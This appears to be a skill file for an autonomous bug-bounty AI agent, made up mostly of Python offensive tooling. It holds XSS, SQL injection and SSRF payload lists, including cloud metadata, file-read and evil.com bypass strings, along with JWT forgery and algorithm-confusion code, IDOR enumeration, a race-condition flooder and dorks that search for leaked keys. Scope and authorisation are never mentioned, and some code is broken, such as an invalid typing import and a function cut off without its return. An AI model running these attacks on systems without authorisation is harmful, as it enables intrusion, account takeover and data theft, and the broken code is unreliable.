---
name: bug-bounty-hunter-v4
description: Elite bug bounty hunting skill providing full-spectrum offensive security capabilities including automated reconnaissance, vulnerability scanning, exploit development, CVE research, creative attack chaining, and comprehensive reporting. Covers web, mobile, network, cloud, API, and IoT security testing with production-ready Python 3.14+ tooling.
---

# BUG BOUNTY SUPER AGENT SKILL (APEX OFFENSIVE FRAMEWORK)

This skill provides the complete technical arsenal for autonomous bug bounty hunting and penetration testing. It includes reusable code templates, exploitation frameworks, reconnaissance automation, and reporting tools.

> SYNC LOCK 3/3:
> - Master System Instruction: [AGENTS.md](./AGENTS.md)
> - Core Operational Rules: [RULES.md](./RULES.md)

---

## 1. RECONNAISSANCE AUTOMATION ENGINE (PYTHON 3.14+)

### 1.1. Subdomain Enumeration Multi-Source

```python
import asyncio
import aiohttp
import json
import argparse
import sys
from typing import set as SetType
from datetime import datetime


async def fetch_crtsh(session: aiohttp.ClientSession, domain: str) -> set[str]:
    """Query crt.sh Certificate Transparency logs for subdomains."""
    subs = set()
    try:
        url = f"https://crt.sh/?q=%.{domain}&output=json"
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=30)) as resp:
            if resp.status == 200:
                data = await resp.json(content_type=None)
                for entry in data:
                    name = entry.get("name_value", "")
                    for sub in name.split("\n"):
                        sub = sub.strip().lower()
                        if sub.endswith(f".{domain}") or sub == domain:
                            subs.add(sub)
    except Exception as e:
        print(f"[!] crt.sh error: {e}")
    return subs


async def fetch_hackertarget(session: aiohttp.ClientSession, domain: str) -> set[str]:
    """Query HackerTarget API for subdomains."""
    subs = set()
    try:
        url = f"https://api.hackertarget.com/hostsearch/?q={domain}"
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=30)) as resp:
            if resp.status == 200:
                text = await resp.text()
                for line in text.strip().split("\n"):
                    if "," in line:
                        sub = line.split(",")[0].strip().lower()
                        if sub.endswith(f".{domain}") or sub == domain:
                            subs.add(sub)
    except Exception as e:
        print(f"[!] HackerTarget error: {e}")
    return subs


async def fetch_alienvault(session: aiohttp.ClientSession, domain: str) -> set[str]:
    """Query AlienVault OTX for subdomains."""
    subs = set()
    try:
        url = f"https://otx.alienvault.com/api/v1/indicators/domain/{domain}/passive_dns"
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=30)) as resp:
            if resp.status == 200:
                data = await resp.json()
                for entry in data.get("passive_dns", []):
                    hostname = entry.get("hostname", "").strip().lower()
                    if hostname.endswith(f".{domain}") or hostname == domain:
                        subs.add(hostname)
    except Exception as e:
        print(f"[!] AlienVault error: {e}")
    return subs


async def fetch_rapiddns(session: aiohttp.ClientSession, domain: str) -> set[str]:
    """Query RapidDNS for subdomains."""
    subs = set()
    try:
        url = f"https://rapiddns.io/subdomain/{domain}?full=1"
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=30)) as resp:
            if resp.status == 200:
                text = await resp.text()
                import re
                pattern = r"([a-zA-Z0-9][-a-zA-Z0-9]*\." + re.escape(domain) + r")"
                matches = re.findall(pattern, text)
                for m in matches:
                    subs.add(m.lower())
    except Exception as e:
        print(f"[!] RapidDNS error: {e}")
    return subs


async def enumerate_subdomains(domain: str) -> set[str]:
    """Run all subdomain enumeration sources concurrently."""
    async with aiohttp.ClientSession() as session:
        tasks = [
            fetch_crtsh(session, domain),
            fetch_hackertarget(session, domain),
            fetch_alienvault(session, domain),
            fetch_rapiddns(session, domain),
        ]
        results = await asyncio.gather(*tasks)
        all_subs = set()
        for result in results:
            all_subs.update(result)
        return all_subs


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Multi-source subdomain enumerator")
    parser.add_argument("domain", help="Target domain")
    parser.add_argument("-o", "--output", help="Output file")
    args = parser.parse_args()

    print(f"[*] Enumerating subdomains for: {args.domain}")
    subs = asyncio.run(enumerate_subdomains(args.domain))
    print(f"[+] Found {len(subs)} unique subdomains")
    for s in sorted(subs):
        print(f"  {s}")
    if args.output:
        with open(args.output, "w") as f:
            f.write("\n".join(sorted(subs)))
        print(f"[+] Saved to {args.output}")
```


### 1.2. HTTP Probe and Technology Fingerprinting

```python
import asyncio
import aiohttp
import re
import json
from typing import Optional


async def probe_host(session: aiohttp.ClientSession, url: str) -> dict:
    """Probe a single host for HTTP response, headers, and technology hints."""
    result = {
        "url": url,
        "status": None,
        "title": None,
        "server": None,
        "headers": {},
        "technologies": [],
        "security_headers": {},
        "redirect": None,
    }
    try:
        async with session.get(
            url, timeout=aiohttp.ClientTimeout(total=10),
            allow_redirects=False, ssl=False
        ) as resp:
            result["status"] = resp.status
            result["headers"] = dict(resp.headers)
            result["server"] = resp.headers.get("Server", "")

            # Check redirect
            if resp.status in (301, 302, 303, 307, 308):
                result["redirect"] = resp.headers.get("Location", "")

            # Security headers check
            sec_headers = [
                "Strict-Transport-Security", "Content-Security-Policy",
                "X-Frame-Options", "X-Content-Type-Options",
                "X-XSS-Protection", "Referrer-Policy",
                "Permissions-Policy", "Cross-Origin-Opener-Policy",
                "Cross-Origin-Resource-Policy", "Cross-Origin-Embedder-Policy",
            ]
            for h in sec_headers:
                val = resp.headers.get(h)
                if val:
                    result["security_headers"][h] = val

            # Extract title
            if "text/html" in resp.headers.get("Content-Type", ""):
                body = await resp.text(errors="ignore")
                title_match = re.search(r"<title[^>]*>(.*?)</title>", body, re.I | re.S)
                if title_match:
                    result["title"] = title_match.group(1).strip()[:200]

                # Technology detection
                tech_patterns = {
                    "WordPress": [r"wp-content", r"wp-includes", r"wordpress"],
                    "React": [r"react\.production", r"__NEXT_DATA__", r"_next/static"],
                    "Angular": [r"ng-version", r"angular\.min\.js"],
                    "Vue.js": [r"vue\.min\.js", r"__vue__"],
                    "jQuery": [r"jquery[.-]\d"],
                    "Bootstrap": [r"bootstrap\.min"],
                    "Laravel": [r"laravel_session", r"XSRF-TOKEN"],
                    "Django": [r"csrfmiddlewaretoken", r"django"],
                    "Express": [r"X-Powered-By.*Express"],
                    "ASP.NET": [r"__VIEWSTATE", r"asp\.net", r"X-AspNet-Version"],
                    "PHP": [r"X-Powered-By.*PHP", r"PHPSESSID"],
                    "Nginx": [r"nginx"],
                    "Apache": [r"Apache"],
                    "Cloudflare": [r"cloudflare", r"cf-ray"],
                    "AWS": [r"AmazonS3", r"x-amz-"],
                }
                full_text = body + str(resp.headers)
                for tech, patterns in tech_patterns.items():
                    for pat in patterns:
                        if re.search(pat, full_text, re.I):
                            result["technologies"].append(tech)
                            break

    except Exception as e:
        result["error"] = str(e)
    return result


async def probe_hosts(urls: list[str], concurrency: int = 50) -> list[dict]:
    """Probe multiple hosts concurrently."""
    sem = asyncio.Semaphore(concurrency)
    connector = aiohttp.TCPConnector(limit=concurrency, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        async def bounded_probe(url):
            async with sem:
                return await probe_host(session, url)
        tasks = [bounded_probe(url) for url in urls]
        return await asyncio.gather(*tasks)
```

---

## 2. VULNERABILITY SCANNING TEMPLATES

### 2.1. XSS Scanner (Reflected)

```python
import asyncio
import aiohttp
import urllib.parse
from typing import Optional

# Comprehensive XSS payload list - context-aware
XSS_PAYLOADS = [
    # Basic
    '<script>alert(document.domain)</script>',
    '<img src=x onerror=alert(document.domain)>',
    '<svg onload=alert(document.domain)>',
    '<body onload=alert(document.domain)>',
    # Event handlers
    '" onmouseover="alert(document.domain)" x="',
    "' onmouseover='alert(document.domain)' x='",
    # Encoding bypasses
    '<img src=x onerror=alert`document.domain`>',
    '<svg/onload=alert(document.domain)>',
    '<details open ontoggle=alert(document.domain)>',
    # Filter bypass
    '<scr<script>ipt>alert(document.domain)</scr</script>ipt>',
    '<IMG SRC=javascript:alert(document.domain)>',
    '<iframe src="javascript:alert(document.domain)">',
    # DOM-based
    'javascript:alert(document.domain)//',
    # Polyglot
    'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert(document.domain) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(document.domain)//>\\x3e',
    # Template injection check
    '{{7*7}}',
    '${7*7}',
    '<%= 7*7 %>',
    # Angular-specific
    '{{constructor.constructor("return this")().alert(document.domain)}}',
]


async def test_xss(
    session: aiohttp.ClientSession,
    url: str,
    param: str,
    payload: str
) -> Optional[dict]:
    """Test a single XSS payload against a URL parameter."""
    try:
        parsed = urllib.parse.urlparse(url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        params[param] = payload
        new_query = urllib.parse.urlencode(params)
        test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))

        async with session.get(
            test_url, timeout=aiohttp.ClientTimeout(total=10),
            allow_redirects=True, ssl=False
        ) as resp:
            body = await resp.text(errors="ignore")
            if payload in body:
                return {
                    "url": test_url,
                    "param": param,
                    "payload": payload,
                    "reflected": True,
                    "status": resp.status,
                    "context": _detect_context(body, payload),
                }
    except Exception:
        pass
    return None


def _detect_context(body: str, payload: str) -> str:
    """Detect the HTML context where the payload is reflected."""
    idx = body.find(payload)
    if idx == -1:
        return "unknown"
    before = body[max(0, idx-100):idx]
    if '"' in before and before.rfind('"') > before.rfind('>'):
        return "attribute_double_quote"
    if "'" in before and before.rfind("'") > before.rfind('>'):
        return "attribute_single_quote"
    if '<script' in before.lower():
        return "javascript"
    if '<style' in before.lower():
        return "css"
    return "html_body"
```


### 2.2. SQL Injection Detector

```python
import asyncio
import aiohttp
import urllib.parse
import re
import time
from typing import Optional

# Error-based SQLi detection patterns
SQL_ERRORS = {
    "MySQL": [
        r"SQL syntax.*?MySQL",
        r"Warning.*?mysqli?",
        r"MySQLSyntaxErrorException",
        r"valid MySQL result",
        r"check the manual that corresponds to your MySQL",
    ],
    "PostgreSQL": [
        r"PostgreSQL.*?ERROR",
        r"Warning.*?\bpg_",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        r"PG::SyntaxError",
    ],
    "MSSQL": [
        r"Driver.*? SQL[\-\_\ ]*Server",
        r"OLE DB.*? SQL Server",
        r"\bSQL Server[^&lt;&quot;]+Driver",
        r"Warning.*?mssql_",
        r"\bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}",
        r"System\.Data\.SqlClient\.SqlException",
    ],
    "Oracle": [
        r"\bORA-[0-9][0-9][0-9][0-9]",
        r"Oracle error",
        r"Oracle.*?Driver",
        r"Warning.*?oci_",
        r"quoted string not properly terminated",
    ],
    "SQLite": [
        r"SQLite/JDBCDriver",
        r"SQLite\.Exception",
        r"System\.Data\.SQLite\.SQLiteException",
        r"Warning.*?sqlite_",
        r"\[SQLITE_ERROR\]",
    ],
}

SQLI_PAYLOADS = [
    "'",
    '"',
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "1' ORDER BY 1--+",
    "1' ORDER BY 100--+",
    "1 AND 1=1",
    "1 AND 1=2",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1; WAITFOR DELAY '0:0:5'--",
    "1' AND SLEEP(5)--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "1 AND pg_sleep(5)--",
]


async def test_sqli(
    session: aiohttp.ClientSession,
    url: str,
    param: str,
    payload: str
) -> Optional[dict]:
    """Test a single SQLi payload against a URL parameter."""
    try:
        parsed = urllib.parse.urlparse(url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        original_value = params.get(param, "")
        params[param] = original_value + payload
        new_query = urllib.parse.urlencode(params)
        test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))

        start_time = time.time()
        async with session.get(
            test_url, timeout=aiohttp.ClientTimeout(total=15),
            allow_redirects=True, ssl=False
        ) as resp:
            elapsed = time.time() - start_time
            body = await resp.text(errors="ignore")

            # Check for error-based SQLi
            for db_type, patterns in SQL_ERRORS.items():
                for pattern in patterns:
                    if re.search(pattern, body, re.I):
                        return {
                            "url": test_url,
                            "param": param,
                            "payload": payload,
                            "type": "error-based",
                            "database": db_type,
                            "evidence": re.search(pattern, body, re.I).group(0),
                            "status": resp.status,
                        }

            # Check for time-based blind SQLi
            if elapsed >= 4.5 and ("SLEEP" in payload.upper() or "WAITFOR" in payload.upper() or "pg_sleep" in payload):
                return {
                    "url": test_url,
                    "param": param,
                    "payload": payload,
                    "type": "time-based-blind",
                    "database": "unknown",
                    "evidence": f"Response delayed {elapsed:.1f}s",
                    "status": resp.status,
                }
    except Exception:
        pass
    return None
```

### 2.3. SSRF Scanner

```python
import asyncio
import aiohttp
import urllib.parse
from typing import Optional

SSRF_PAYLOADS = [
    # Localhost variants
    "http://127.0.0.1",
    "http://localhost",
    "http://0.0.0.0",
    "http://[::1]",
    "http://0177.0.0.1",  # Octal
    "http://0x7f.0x0.0x0.0x1",  # Hex
    "http://2130706433",  # Decimal
    "http://127.1",
    "http://127.0.0.1.nip.io",
    # Cloud metadata endpoints
    "http://169.254.169.254/latest/meta-data/",  # AWS
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
    "http://metadata.google.internal/computeMetadata/v1/",  # GCP
    "http://169.254.169.254/opc/v1/instance/",  # Oracle Cloud
    # DNS rebinding
    "http://spoofed.burpcollaborator.net",
    # Protocol smuggling
    "gopher://127.0.0.1:6379/_INFO",
    "dict://127.0.0.1:6379/INFO",
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    # Bypass techniques
    "http://127.0.0.1:80@evil.com",
    "http://evil.com#@127.0.0.1",
    "http://127.0.0.1%23@evil.com",
]


async def test_ssrf(
    session: aiohttp.ClientSession,
    url: str,
    param: str,
    callback_url: str = None
) -> list[dict]:
    """Test SSRF payloads against a URL parameter."""
    findings = []
    for payload in SSRF_PAYLOADS:
        try:
            parsed = urllib.parse.urlparse(url)
            params = dict(urllib.parse.parse_qsl(parsed.query))
            params[param] = payload
            new_query = urllib.parse.urlencode(params)
            test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))

            async with session.get(
                test_url, timeout=aiohttp.ClientTimeout(total=10),
                allow_redirects=False, ssl=False
            ) as resp:
                body = await resp.text(errors="ignore")

                # Check for SSRF indicators
                indicators = [
                    "root:x:0:0",  # /etc/passwd
                    "[fonts]",  # win.ini
                    "ami-id",  # AWS metadata
                    "instance-id",  # Cloud metadata
                    "computeMetadata",  # GCP
                    "redis_version",  # Redis
                ]
                for indicator in indicators:
                    if indicator in body:
                        findings.append({
                            "url": test_url,
                            "param": param,
                            "payload": payload,
                            "indicator": indicator,
                            "status": resp.status,
                        })
                        break
        except Exception:
            pass
    return findings
```


---

## 3. EXPLOIT DEVELOPMENT TEMPLATES

### 3.1. JWT Attack Suite

```python
import base64
import json
import hmac
import hashlib
from typing import Optional


def decode_jwt(token: str) -> dict:
    """Decode a JWT token without verification."""
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("Invalid JWT format")

    def b64_decode(data: str) -> bytes:
        padding = 4 - len(data) % 4
        data += "=" * padding
        return base64.urlsafe_b64decode(data)

    header = json.loads(b64_decode(parts[0]))
    payload = json.loads(b64_decode(parts[1]))
    return {"header": header, "payload": payload, "signature": parts[2]}


def forge_jwt_none(payload: dict) -> str:
    """Forge a JWT with alg=none (CVE-2015-9235 / JWT None Algorithm Attack)."""
    header = {"alg": "none", "typ": "JWT"}
    h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=").decode()
    p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
    # Try multiple none variants
    variants = []
    for alg in ["none", "None", "NONE", "nOnE"]:
        header["alg"] = alg
        h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=").decode()
        variants.append(f"{h}.{p}.")
    return variants


def forge_jwt_hs256(payload: dict, secret: str) -> str:
    """Forge a JWT with a known/weak secret (HS256)."""
    header = {"alg": "HS256", "typ": "JWT"}
    h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=").decode()
    p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
    signing_input = f"{h}.{p}"
    sig = hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()
    s = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
    return f"{h}.{p}.{s}"


def jwt_confusion_attack(token: str, public_key: str) -> str:
    """Algorithm confusion attack: RS256 to HS256 using public key as HMAC secret."""
    decoded = decode_jwt(token)
    decoded["header"]["alg"] = "HS256"
    h = base64.urlsafe_b64encode(json.dumps(decoded["header"]).encode()).rstrip(b"=").decode()
    p = base64.urlsafe_b64encode(json.dumps(decoded["payload"]).encode()).rstrip(b"=").decode()
    signing_input = f"{h}.{p}"
    sig = hmac.new(public_key.encode(), signing_input.encode(), hashlib.sha256).digest()
    s = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
    return f"{h}.{p}.{s}"


# Common weak JWT secrets to try
WEAK_JWT_SECRETS = [
    "secret", "password", "123456", "admin", "key",
    "jwt_secret", "changeme", "test", "default",
    "supersecret", "mysecret", "jwt", "token",
    "s3cr3t", "p@ssw0rd", "qwerty", "letmein",
    "", "null", "undefined", "true", "false",
]
```

### 3.2. IDOR Testing Framework

```python
import asyncio
import aiohttp
import json
from typing import Optional


async def test_idor(
    session: aiohttp.ClientSession,
    url_template: str,
    auth_headers: dict,
    id_range: range,
    current_user_id: int,
    method: str = "GET",
) -> list[dict]:
    """Test for IDOR by iterating through object IDs.

    url_template: URL with {id} placeholder, e.g., https://api.target.com/users/{id}/profile
    auth_headers: Headers with auth token of low-privilege user
    id_range: Range of IDs to test
    current_user_id: The authenticated user own ID
    """
    findings = []
    for obj_id in id_range:
        if obj_id == current_user_id:
            continue
        url = url_template.replace("{id}", str(obj_id))
        try:
            async with session.request(
                method, url, headers=auth_headers,
                timeout=aiohttp.ClientTimeout(total=10), ssl=False
            ) as resp:
                if resp.status == 200:
                    body = await resp.text()
                    findings.append({
                        "url": url,
                        "id": obj_id,
                        "status": resp.status,
                        "body_length": len(body),
                        "body_preview": body[:500],
                    })
                    print(f"[+] IDOR FOUND: {url} -> {resp.status} ({len(body)} bytes)")
        except Exception as e:
            pass
    return findings


async def test_idor_uuid(
    session: aiohttp.ClientSession,
    url_template: str,
    auth_headers_user_a: dict,
    auth_headers_user_b: dict,
    user_b_resource_url: str,
) -> Optional[dict]:
    """Test IDOR with UUIDs by using User B resource URL with User A credentials."""
    try:
        async with session.get(
            user_b_resource_url, headers=auth_headers_user_a,
            timeout=aiohttp.ClientTimeout(total=10), ssl=False
        ) as resp:
            if resp.status == 200:
                body = await resp.text()
                return {
                    "url": user_b_resource_url,
                    "status": resp.status,
                    "body_length": len(body),
                    "body_preview": body[:500],
                    "verdict": "IDOR CONFIRMED - User A can access User B resources",
                }
    except Exception:
        pass
    return None
```


### 3.3. Race Condition Exploiter

```python
import asyncio
import aiohttp
import time
from typing import Optional


async def race_condition_test(
    url: str,
    method: str = "POST",
    headers: dict = None,
    data: dict = None,
    json_data: dict = None,
    concurrent_requests: int = 20,
    rounds: int = 5,
) -> list[dict]:
    """Send multiple concurrent requests to test for race conditions.

    Use cases:
    - Double spending / duplicate transactions
    - Coupon/voucher reuse
    - Follow/like count manipulation
    - Inventory bypass (buying more than available)
    - Rate limit bypass
    """
    all_results = []

    for round_num in range(rounds):
        connector = aiohttp.TCPConnector(limit=concurrent_requests)
        async with aiohttp.ClientSession(connector=connector) as session:
            async def send_request(req_id: int):
                start = time.time()
                try:
                    kwargs = {
                        "timeout": aiohttp.ClientTimeout(total=10),
                        "ssl": False,
                    }
                    if headers:
                        kwargs["headers"] = headers
                    if data:
                        kwargs["data"] = data
                    if json_data:
                        kwargs["json"] = json_data

                    async with session.request(method, url, **kwargs) as resp:
                        body = await resp.text()
                        elapsed = time.time() - start
                        return {
                            "round": round_num,
                            "request_id": req_id,
                            "status": resp.status,
                            "body_length": len(body),
                            "body_preview": body[:300],
                            "elapsed": elapsed,
                        }
                except Exception as e:
                    return {
                        "round": round_num,
                        "request_id": req_id,
                        "error": str(e),
                    }

            # Fire all requests simultaneously
            tasks = [send_request(i) for i in range(concurrent_requests)]
            results = await asyncio.gather(*tasks)
            all_results.extend(results)

            # Analyze results for race condition indicators
            success_count = sum(1 for r in results if r.get("status") == 200)
            unique_bodies = len(set(r.get("body_preview", "") for r in results if "body_preview" in r))

            print(f"Round {round_num}: {success_count}/{concurrent_requests} succeeded, {unique_bodies} unique responses")

    return all_results
```

---

## 4. CVE RESEARCH AND EXPLOIT LOOKUP

### 4.1. CVE Search Engine

```python
import asyncio
import aiohttp
import json
from typing import Optional


async def search_cves(
    keyword: str,
    session: aiohttp.ClientSession = None,
) -> list[dict]:
    """Search for CVEs related to a keyword/technology using NVD API."""
    own_session = session is None
    if own_session:
        session = aiohttp.ClientSession()

    results = []
    try:
        # NVD API v2
        url = "https://services.nvd.nist.gov/rest/json/cves/2.0"
        params = {
            "keywordSearch": keyword,
            "resultsPerPage": 20,
        }
        async with session.get(url, params=params, timeout=aiohttp.ClientTimeout(total=30)) as resp:
            if resp.status == 200:
                data = await resp.json()
                for vuln in data.get("vulnerabilities", []):
                    cve = vuln.get("cve", {})
                    cve_id = cve.get("id", "")
                    descriptions = cve.get("descriptions", [])
                    desc = next((d["value"] for d in descriptions if d["lang"] == "en"), "")

                    # Extract CVSS score
                    metrics = cve.get("metrics", {})
                    cvss_score = None
                    cvss_vector = None
                    for version in ["cvssMetricV31", "cvssMetricV30", "cvssMetricV2"]:
                        if version in metrics:
                            cvss_data = metrics[version][0].get("cvssData", {})
                            cvss_score = cvss_data.get("baseScore")
                            cvss_vector = cvss_data.get("vectorString")
                            break

                    results.append({
                        "cve_id": cve_id,
                        "description": desc,
                        "cvss_score": cvss_score,
                        "cvss_vector": cvss_vector,
                        "published": cve.get("published", ""),
                        "modified": cve.get("lastModified", ""),
                    })
    except Exception as e:
        print(f"[!] NVD API error: {e}")
    finally:
        if own_session:
            await session.close()

    return results


async def search_exploitdb(keyword: str) -> list[dict]:
    """Search Exploit-DB for public exploits."""
    results = []
    async with aiohttp.ClientSession() as session:
        try:
            url = f"https://exploit-db.com/search?q={keyword}"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                if resp.status == 200:
                    body = await resp.text()
                    # Parse results (simplified - in production use proper HTML parser)
                    import re
                    exploit_links = re.findall(r'/exploits/(\d+)', body)
                    for eid in exploit_links[:10]:
                        results.append({
                            "exploit_id": eid,
                            "url": f"https://www.exploit-db.com/exploits/{eid}",
                        })
        except Exception as e:
            print(f"[!] ExploitDB search error: {e}")
    return results


async def search_github_pocs(cve_id: str) -> list[dict]:
    """Search GitHub for PoC exploits for a specific CVE."""
    results = []
    async with aiohttp.ClientSession() as session:
        try:
            url = f"https://api.github.com/search/repositories?q={cve_id}+poc&sort=stars&order=desc"
            headers = {"Accept": "application/vnd.github.v3+json"}
            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    for repo in data.get("items", [])[:10]:
                        results.append({
                            "name": repo["full_name"],
                            "url": repo["html_url"],
                            "stars": repo["stargazers_count"],
                            "description": repo.get("description", ""),
                            "language": repo.get("language", ""),
                        })
        except Exception as e:
            print(f"[!] GitHub search error: {e}")
    return results
```

---

## 5. REPORTING ENGINE

### 5.1. Bug Bounty Report Generator

```python
from datetime import datetime
from typing import Optional


def generate_report(
    title: str,
    severity: str,
    cvss_score: float,
    cvss_vector: str,
    description: str,
    steps_to_reproduce: list[str],
    impact: str,
    remediation: str,
    affected_url: str,
    poc_code: str = None,
    screenshots: list[str] = None,
    references: list[str] = None,
    platform: str = "hackerone",
) -> str:
    """Generate a professional bug bounty report."""

    report = f"""# {title}

## Summary
**Severity:** {severity}
**CVSS Score:** {cvss_score} ({cvss_vector})
**Affected Asset:** {affected_url}
**Date:** {datetime.now().strftime("%Y-%m-%d")}

## Description
{description}

## Steps to Reproduce
"""
    for i, step in enumerate(steps_to_reproduce, 1):
        report += f"{i}. {step}\n"

    report += f"""
## Impact
{impact}

## Proof of Concept
"""
    if poc_code:
        report += f"```\n{poc_code}\n```\n"

    report += f"""
## Remediation
{remediation}
"""
    if references:
        report += "\n## References\n"
        for ref in references:
            report += f"- {ref}\n"

    return report
```

---

## 6. GOOGLE DORKING ENGINE

### 6.1. Dork Generator

```python
def generate_google_dorks(domain: str) -> list[dict]:
    """Generate comprehensive Google dorks for a target domain."""
    dorks = [
        # Sensitive files
        {"category": "Sensitive Files", "dork": f'site:{domain} ext:sql | ext:db | ext:log | ext:cfg | ext:env | ext:ini | ext:bak'},
        {"category": "Sensitive Files", "dork": f'site:{domain} ext:xml | ext:json | ext:yml | ext:yaml | ext:toml'},
        {"category": "Sensitive Files", "dork": f'site:{domain} ext:conf | ext:cnf | ext:config'},
        {"category": "Sensitive Files", "dork": f'site:{domain} filetype:pdf | filetype:doc | filetype:xlsx'},

        # Exposed directories
        {"category": "Directory Listing", "dork": f'site:{domain} intitle:"index of" | intitle:"directory listing"'},
        {"category": "Directory Listing", "dork": f'site:{domain} intitle:"index of" "parent directory"'},

        # Login pages
        {"category": "Login Pages", "dork": f'site:{domain} inurl:login | inurl:signin | inurl:admin | inurl:dashboard'},
        {"category": "Login Pages", "dork": f'site:{domain} inurl:wp-admin | inurl:wp-login'},

        # Sensitive information
        {"category": "Information Disclosure", "dork": f'site:{domain} "password" | "api_key" | "apikey" | "secret" | "token"'},
        {"category": "Information Disclosure", "dork": f'site:{domain} "BEGIN RSA PRIVATE KEY" | "BEGIN DSA PRIVATE KEY"'},
        {"category": "Information Disclosure", "dork": f'site:{domain} inurl:phpinfo | inurl:server-status | inurl:server-info'},

        # Error pages
        {"category": "Error Pages", "dork": f'site:{domain} "SQL syntax" | "mysql_fetch" | "ORA-" | "PostgreSQL"'},
        {"category": "Error Pages", "dork": f'site:{domain} "Warning:" "on line" ext:php'},
        {"category": "Error Pages", "dork": f'site:{domain} "Fatal error" | "Uncaught exception" | "Stack trace"'},

        # API endpoints
        {"category": "API Endpoints", "dork": f'site:{domain} inurl:api | inurl:v1 | inurl:v2 | inurl:v3'},
        {"category": "API Endpoints", "dork": f'site:{domain} inurl:graphql | inurl:swagger | inurl:openapi'},
        {"category": "API Endpoints", "dork": f'site:{domain} ext:json inurl:api'},

        # Subdomains and related
        {"category": "Subdomains", "dork": f'site:*.{domain} -www'},

        # GitHub/GitLab leaks
        {"category": "Code Leaks", "dork": f'site:github.com "{domain}"'},
        {"category": "Code Leaks", "dork": f'site:gitlab.com "{domain}"'},
        {"category": "Code Leaks", "dork": f'site:pastebin.com "{domain}"'},

        # Cloud storage
        {"category": "Cloud Storage", "dork": f'site:s3.amazonaws.com "{domain}"'},
        {"category": "Cloud Storage", "dork": f'site:blob.core.windows.net "{domain}"'},
        {"category": "Cloud Storage", "dork": f'site:storage.googleapis.com "{domain}"'},
    ]
    return dorks
```

---

## 7. SECURITY HEADER ANALYZER

```python
def analyze_security_headers(headers: dict) -> dict:
    """Analyze HTTP response headers for security misconfigurations."""
    analysis = {"score": 0, "max_score": 0, "findings": [], "recommendations": []}

    checks = {
        "Strict-Transport-Security": {
            "weight": 10,
            "good": lambda v: "max-age=" in v and int(v.split("max-age=")[1].split(";")[0].strip()) >= 31536000,
            "recommendation": "Add HSTS header with max-age >= 31536000 and includeSubDomains",
        },
        "Content-Security-Policy": {
            "weight": 10,
            "good": lambda v: "default-src" in v and "unsafe-inline" not in v,
            "recommendation": "Implement strict CSP without unsafe-inline or unsafe-eval",
        },
        "X-Frame-Options": {
            "weight": 5,
            "good": lambda v: v.upper() in ["DENY", "SAMEORIGIN"],
            "recommendation": "Set X-Frame-Options to DENY or SAMEORIGIN",
        },
        "X-Content-Type-Options": {
            "weight": 5,
            "good": lambda v: v.lower() == "nosniff",
            "recommendation": "Set X-Content-Type-Options: nosniff",
        },
        "Referrer-Policy": {
            "weight": 5,
            "good": lambda v: v in ["no-referrer", "strict-origin-when-cross-origin", "same-origin"],
            "recommendation": "Set Referrer-Policy to strict-origin-when-cross-origin",
        },
        "Permissions-Policy": {
            "weight": 5,
            "good": lambda v: len(v) > 0,
            "recommendation": "Implement Permissions-Policy to restrict browser features",
        },
        "Cross-Origin-Opener-Policy": {
            "weight": 3,
            "good": lambda v: v in ["same-origin", "same-origin-allow-popups"],
            "recommendation": "Set Cross-Origin-Opener-Policy: same-origin",
        },
        "Cross-Origin-Resource-Policy": {
            "weight": 3,
            "good": lambda v: v in ["same-origin", "same-site"],
            "recommendation": "Set Cross-Origin-Resource-Policy: same-origin",
        },
    }

    for header_name, check in checks.items():
        analysis["max_score"] += check["weight"]
        value = headers.get(header_name)
        if value:
            try:
                if check["good"](value):
                    analysis["score"] += check["weight"]
                    analysis["findings"].append({
                        "header": header_name,
                        "status": "PASS",
                        "value": value,
                    })
                else:
                    analysis["findings"].append({
                        "header": header_name,
                        "status": "WEAK",
                        "value": value,
                        "recommendation": check["recommendation"],
                    })
            except Exception:
                analysis["findings"].append({
                    "header": header_name,
                    "status": "ERROR",
                    "value": value,
                })
        else:
            analysis["findings"].append({
                "header": header_name,
                "status": "MISSING",
                "recommendation": check["recommendation"],
            })
            analysis["recommendations"].append(check["recommendation"])

    # Check for information disclosure headers
    bad_headers = ["X-Powered-By", "Server", "X-AspNet-Version", "X-AspNetMvc-Version"]
    for bh in bad_headers:
        if bh in headers:
            analysis["findings"].append({
                "header": bh,
                "status": "INFO_LEAK",
                "value": headers[bh],
                "recommendation": f"Remove {bh} header to prevent technology disclosure",
            })

